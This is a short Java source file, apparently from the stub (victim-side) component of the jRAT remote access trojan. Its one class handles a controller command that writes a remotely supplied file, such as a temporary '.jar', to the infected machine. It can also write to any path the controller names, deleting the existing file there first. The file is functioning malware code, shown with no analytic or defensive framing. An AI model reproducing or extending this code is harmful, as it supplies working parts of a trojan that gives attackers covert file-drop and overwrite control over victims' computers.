package io.jrat.stub.packets.incoming;

import io.jrat.common.io.FileCache;
import io.jrat.common.io.TransferData;
import io.jrat.stub.Connection;
import io.jrat.stub.packets.Temp;

import java.io.File;


public class Packet42ClientDownloadFile extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		boolean temp = con.readBoolean();
		String f = con.readLine();
		long l = con.readLong();
		
		File file;
		
		if (temp) {
			file = File.createTempFile("download", ".jar");
			Temp.MAP.put(f, file);
		} else {
			file = new File(f);
		}

		if (file.exists() && file.isFile()) {
			file.delete();
		}

		TransferData d = new TransferData();
		d.setLocalFile(file);
		d.setTotal(l);
		FileCache.put(f, d);
	}

}
